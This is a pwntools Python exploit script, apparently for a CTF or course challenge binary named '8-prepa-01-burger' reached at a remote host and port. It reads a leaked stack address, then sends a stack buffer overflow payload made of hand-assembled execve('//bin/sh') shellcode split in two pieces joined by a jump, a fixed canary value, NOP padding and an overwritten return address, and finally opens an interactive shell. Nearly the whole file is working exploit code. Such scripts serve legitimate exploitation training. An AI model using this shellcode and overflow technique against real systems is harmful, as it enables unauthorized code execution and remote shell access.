#!/usr/bin/env python3
import re

from pwn import *

exe = context.binary = ELF(args.EXE or "8-prepa-01-burger")

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]
    io = gdb.debug(
        "./8-prepa-01-burger",
        """
        source /home/ryan/.gdbinit-gef.py
        b *main +81 
        continue
        """,
    )
elif args.LOCAL:
    io = process("./8-prepa-01-burger")
else:
    io = remote("cytech.tcdn.casa", 4801)

io.recvuntil(b"at ")
raw = io.recvuntil(b"\n\n", drop=True)
m = re.search(rb"0x[0-9a-fA-F]+", raw)
leak = int(m.group(0), 16)

canary_offset = 15
canary_size = 8
saved_rip_offset = 39

# Addresses absolues
buffer_addr = leak
saved_rip_addr = buffer_addr + saved_rip_offset
space_after_canary = saved_rip_offset - (canary_offset + canary_size)

# --- piece2 : movabs rdi,"//bin/sh" ; jmp rel32 -> piece1
movabs_prefix = b"\x48\xbf"
imm64 = p64(0x68732F6E69622F2F)  # "//bin/sh" en little-endian
jmp_opcode = b"\xe9"

movabs_len = 10
jmp_len = 5
piece2_len = movabs_len + jmp_len  # 15 octets

piece2_addr = buffer_addr + canary_offset + canary_size

piece1 = b"\x57" b"\x48\x89\xe7" b"\x48\x0f\xaf\xf0" b"\xb0\x3b" b"\x0f\x05"

piece1_addr = buffer_addr

next_instr_addr = piece2_addr + piece2_len
rel32 = (piece1_addr - next_instr_addr) & 0xFFFFFFFF
rel32_bytes = struct.pack("<I", rel32)

piece2 = movabs_prefix + imm64 + jmp_opcode + rel32_bytes
assert len(piece2) == piece2_len

# Payload
pad_before_canary = b"\x90" * (canary_offset - len(piece1))
payload = piece1 + pad_before_canary

payload += p64(0xDEADBEEFDEADBEEF)[:canary_size]

payload += piece2
pad_after_piece2 = b"\x90"
payload += pad_after_piece2
payload += p64(piece2_addr)
io.send(payload + b"\n")
io.interactive()
